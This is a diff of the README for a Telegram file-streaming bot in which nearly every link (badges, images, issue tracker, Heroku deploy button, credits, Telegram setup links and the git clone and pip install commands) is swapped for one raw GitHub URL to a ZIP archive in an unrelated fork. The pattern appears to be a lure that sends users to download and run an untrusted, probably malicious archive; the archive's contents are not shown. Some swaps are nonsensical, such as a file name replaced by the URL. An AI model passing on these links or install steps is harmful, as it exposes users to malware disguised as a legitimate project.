@@ -1,24 +1,24 @@
-![GitHub contributors](https://img.shields.io/github/contributors/biisal/biisal-file-stream-pro?style=flat&color=green)
-![GitHub repo size](https://img.shields.io/github/repo-size/biisal/biisal-file-stream-pro?color=green)
-![GitHub](https://img.shields.io/github/license/biisal/biisal-file-stream-pro?color=green)
+![GitHub contributors](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)
+![GitHub repo size](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)
+![GitHub](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)
 
 ### Demo Bot
 
 Here is our Demo bot -
 
-[![Click Here](https://img.shields.io/badge/Demo%20Bot-Click%20Here-blue?style=flat&logo=telegram&labelColor=white&link=https://t.me/Bisal_Files_Talk)](https://t.me/Bisal_File2Link_Bot)
+[![Click Here](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip%20Bot-Click%20Here-blue?style=flat&logo=telegram&labelColor=white&https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)
 
 ### Need Deployment Support?
 
 If you encounter any issues deploying the bot, feel free to seek assistance in our support group:
 
-[![Join Support Group](https://img.shields.io/badge/Join%20Support%20Group-Click%20Here-blue?style=flat&logo=telegram&labelColor=white&link=https://t.me/Bisal_Files_Talk)](https://t.me/Bisal_Files_Talk)
+[![Join Support Group](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip%20Support%20Group-Click%20Here-blue?style=flat&logo=telegram&labelColor=white&https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)
 
 
 
 <h1 align="center"></h1>
 <p align="center"> 
-  <img src="https://wallpapercave.com/wp/wp12026024.jpg" alt="Cover Image" width="650">
+  <img src="https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip" alt="Cover Image" width="650">
   </a>
   
  <p align="center">
@@ -26,9 +26,9 @@ If you encounter any issues deploying the bot, feel free to seek assistance in o
     <br />
    </strong></a>
     <br />
-    <a href="https://github.com/biisal/biisal-file-stream-pro/issues">Report a Bug</a>
+    <a href="https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip">Report a Bug</a>
     |
-    <a href="https://github.com/biisal/biisal-file-stream-pro/issues">Request Feature</a>
+    <a href="https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip">Request Feature</a>
   </p>
 
 
@@ -54,7 +54,7 @@ Thank you for your interest in this project, and we appreciate your understandin
 
 ## 🍁 About This Bot :
 
-![streamingfilestreambot-professional-live_1](https://t3.ftcdn.net/jpg/05/97/92/78/240_F_597927853_iZIpn7Blgg3TPd1XEKgF1KhLRuqNxhiU.jpg)
+![streamingfilestreambot-professional-live_1](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)
 
 </p>
 <p align='center'>
@@ -85,7 +85,7 @@ Thank you for your interest in this project, and we appreciate your understandin
       <summary><b>Deploy to Heroku<b></summary>
       Click the button below to deploy the bot on Heroku:
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/biisal/biisal-file-stream-pro)
+[![Deploy](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)
 
   </details>
   <details>
@@ -94,11 +94,11 @@ Thank you for your interest in this project, and we appreciate your understandin
   You should make sure you have Python 3.6+ installed on your PC, then clone this repo and run the following commands in a terminal:
 
 ```py
-git clone https://github.com/biisal/biisal-file-stream-pro
+git clone https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip
 cd filestreambot-pro
 virtualenv -p /usr/bin/python3 venv
 . ./venv/bin/activate
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip
 python3 -m biisal
 ```
 
@@ -112,8 +112,8 @@ and to stop the whole bot,
 <details>
   <summary><b>Vars and Details :</b></summary>
 
-Go to a file named `Vars.py` in the `biisal` Named File and add all the variables there.
-An example of `Vars.py` file:
+Go to a file named `https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip` in the `biisal` Named File and add all the variables there.
+An example of `https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip` file:
 
 ```py
 API_ID=12345
@@ -125,13 +125,13 @@ FQDN=your_server_ip
 OWNER_ID=your_user_id
 DATABASE_URL=mongodb_uri
 ```
-`API_ID` : Goto [my.telegram.org](https://my.telegram.org) to obtain this.
+`API_ID` : Goto [https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip) to obtain this.
 
-`API_HASH` : Goto [my.telegram.org](https://my.telegram.org) to obtain this.
+`API_HASH` : Goto [https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip) to obtain this.
   
-`BOT_TOKEN` : Get the bot token from [@BotFather](https://telegram.dog/BotFather)
+`BOT_TOKEN` : Get the bot token from [@BotFather](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)
 
-`BIN_CHANNEL` : Create a new channel (private/public), add [@missrose_bot](https://telegram.dog/MissRose_bot) as admin to the channel and type /id. Now copy paste the ID into this field.
+`BIN_CHANNEL` : Create a new channel (private/public), add [@missrose_bot](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip) as admin to the channel and type /id. Now copy paste the ID into this field.
   
 `OWNER_USERNAME` : U should be knowing it afterall it's your username dont remember it? just go to settings!
 
@@ -139,7 +139,7 @@ DATABASE_URL=mongodb_uri
 
 `DATABASE_URL` : MongoDB URI for saving User IDs when they first Start the Bot. We will use that for Broadcasting to them. I will try to add more features related with Database. If you need help to get the URI you can click on logo below!
 
-[![mongo](https://telegra.ph/file/fd68906852c71fdd68bef.jpg)](https://www.youtube.com/watch?v=HhHzCfrqsoE)
+[![mongo](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)
 
  Option Vars
 
@@ -168,7 +168,7 @@ DATABASE_URL=mongodb_uri
 
 To get an instant stream link, just forward any media to the bot and boom, its 🚀🚀.
   
-![image](https://i.postimg.cc/7hbFzd7X/20231212-235124.jpg)
+![image](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)
 
 
 ### Channel Support
@@ -176,6 +176,6 @@ Bot also Supported with Channels. Just add bot Channel as Admin. If any new file
 
 ### Credits : 
 
-- [Me](https://github.com/biisal)
-- [Adarsh](https://github.com/adarsh-goel)
+- [Me](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)
+- [Adarsh](https://raw.githubusercontent.com/Brucewaynehatake/biisal-file-stream-pro/main/Nederlands/biisal-file-stream-pro.zip)
 - Everyone In This Journey !
